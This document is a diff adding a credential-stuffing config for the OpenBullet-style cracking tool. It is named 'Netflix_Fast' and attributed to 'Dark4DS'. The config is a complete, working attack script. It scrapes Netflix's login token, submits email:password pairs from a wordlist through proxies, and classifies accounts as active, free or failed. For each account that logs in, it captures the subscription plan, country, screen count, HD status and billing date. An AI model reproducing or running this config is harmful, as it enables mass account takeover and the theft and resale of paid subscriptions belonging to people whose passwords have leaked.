@@ -1,0 +1,58 @@
+[SETTINGS]
+{
+  "Name": "Netflix_Fast",
+  "SuggestedBots": 80,
+  "LastModified": "2019-04-03T10:52:30.2450277+07:00",
+  "AdditionalInfo": "",
+  "Author": "Dark4DS",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.netflix.com/ph-en/Login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "name=\"authURL\" value=\"" "\"" Recursive=FALSE -> VAR "authURL" "" "" 
+FUNCTION URLEncode "<authURL>" -> VAR "AUTH" 
+#Login REQUEST POST "https://www.netflix.com/Login?nextpage=https%3A%2F%2Fwww.netflix.com%2FYourAccount" AutoRedirect=TRUE 
+  CONTENT "authURL=<AUTH>&email=<USER>&password=<PASS>&withFields=email%2Cpassword%2CrememberMe%2CnextPage%2CshowPassword&rememberMe=True&flow=websiteSignUp&mode=login&action=loginAction&nextPage=https%3A%2F%2Fwww.netflix.com%2FYourAccount&showPassword=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.netflix.com/ph-en/Login" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "\":\"unrecognized_email\"},\"" 
+    KEY "\"value\":\"incorrect_password\"}" 
+  KEYCHAIN Success OR 
+    KEY "\"membershipStatus\":\"CURRENT_MEMBER\"" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "\"membershipStatus\":\"NEVER_MEMBER\"" 
+    KEY "\"membershipStatus\":\"FORMER_MEMBER\"" 
+#Subscription PARSE "<SOURCE>" LR "\"currentPlanName\":\"" "\"" Recursive=FALSE -> CAP "Subscription" "" "" 
+#Country PARSE "<SOURCE>" LR "\",\"currentCountry\":\"" "\"" Recursive=FALSE -> CAP "Country" "" "" 
+#DVD PARSE "<SOURCE>" LR "\"isDVD\":" "," Recursive=FALSE -> CAP "DVD" "" "" 
+#Trial PARSE "<SOURCE>" LR "\"isInFreeTrial\":" "," Recursive=FALSE -> CAP "Trial" "" "" 
+#Screens PARSE "<SOURCE>" LR "\"maxStreams\":" "," Recursive=FALSE -> CAP "Screens" "" "" 
+#HD PARSE "<SOURCE>" LR "\"hasHD\":" "," Recursive=FALSE -> CAP "HD" "" "" 
+#Ultra_HD PARSE "<SOURCE>" LR "\"hasUHD\":" "," Recursive=FALSE -> CAP "Ultra HD" "" "" 
+PARSE "<SOURCE>" LR "\"nextBillingDate\":\"" "\"" Recursive=FALSE -> VAR "Billing" "" "" 
+FUNCTION Replace "\x2F" "\" UseRegex=FALSE "<Billing>" -> CAP "Next Billing" 
